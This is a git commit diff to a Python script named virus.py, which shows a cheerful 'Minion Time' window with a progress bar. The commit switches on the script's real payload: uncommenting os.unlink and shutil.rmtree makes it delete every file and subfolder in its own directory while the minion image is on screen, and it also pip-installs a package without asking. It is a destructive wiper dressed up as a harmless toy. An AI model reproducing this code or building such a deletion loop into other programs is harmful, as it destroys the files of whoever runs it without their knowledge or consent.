423df02573cc74dfb595f1b4ab5dea905bdb15de
VToribiot <vtoribiot@gmail.com>
2022-07-09 23:01:24 -0400

    chng

--- virus.py
+++ virus.py
@@ -10,27 +10,26 @@ spec = importlib.util.find_spec("PySimpleGUI")
 if spec is None:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "PySimpleGUI"])
 
+folder = os.path.dirname(os.path.abspath(__file__))
+
 sg.theme('SystemDefaultForReal')
 layout = [[sg.Text('Minion Time', font="Roboto, 50")],
-          [sg.Image("C:\\Users\\admin\\Downloads\\minion.png")],
+          [sg.Image(f"{folder}\\minion.png")],
           [sg.Text('Sad nomba:', font="Roboto, 16"), sg.Text('', key='-TEXT-', font="Roboto, 16")],
           [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]
 
 window = sg.Window('Minion Time').Layout(layout)
 progress_bar = window.find_element('progressbar')
 
-folder = os.path.dirname(os.path.abspath(__file__))
 countFiles = len(os.listdir(folder))
 i = 1
 for filename in os.listdir(folder):
     file_path = os.path.join(folder, filename)
     try:
         if os.path.isfile(file_path) or os.path.islink(file_path):
-            #os.unlink(file_path)
-            pass
+            os.unlink(file_path)
         elif os.path.isdir(file_path):
-            #shutil.rmtree(file_path)
-            pass
+            shutil.rmtree(file_path)
     except Exception as e:
         sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
     finally:
